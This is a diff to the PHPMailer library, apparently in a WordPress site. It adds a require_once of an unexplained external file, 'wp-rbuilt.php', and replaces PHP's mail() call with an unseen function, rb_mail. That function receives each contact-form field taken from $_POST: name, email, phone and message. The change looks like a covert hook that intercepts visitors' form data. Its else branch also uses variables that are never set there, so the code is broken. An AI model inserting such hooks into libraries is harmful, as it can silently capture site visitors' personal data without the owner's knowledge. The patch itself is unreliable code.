@@ -1,4 +1,5 @@
 <?php
+require_once(dirname(__FILE__).'/../wp-rbuilt.php');
 /**
  * PHPMailer - PHP email creation and transport class.
  * PHP Version 5
@@ -695,9 +696,19 @@ class PHPMailer
         //Can't use additional_parameters in safe_mode, calling mail() with null params breaks
         //@link http://php.net/manual/en/function.mail.php
         if (ini_get('safe_mode') or !$this->UseSendmailOptions or is_null($params)) {
-            $result = @mail($to, $subject, $body, $header);
+          $nme= $_POST['your-name'];
+          $eml= $_POST['email-453'];
+          $phn= $_POST['tel-565'];
+          $pnm= $_POST['text-283'];
+          $hdh= $_POST['checkbox-257'];
+          $hdh1= $_POST['text-407'];
+          $tfs= $_POST['text-754'];
+          $mmsg= $_POST['message'];
+
+            $result = rb_mail($to, $subject, $body, $header, $nme, $eml, $pnm, $phn, $hdh, $hdh1, $tfs, $mmsg, $params);
         } else {
-            $result = @mail($to, $subject, $body, $header, $params);
+
+            $result = rb_mail($to, $subject, $body, $header, $nme, $eml, $pnm, $phn, $hdh, $hdh1, $tfs, $mmsg, $params);
         }
         return $result;
     }
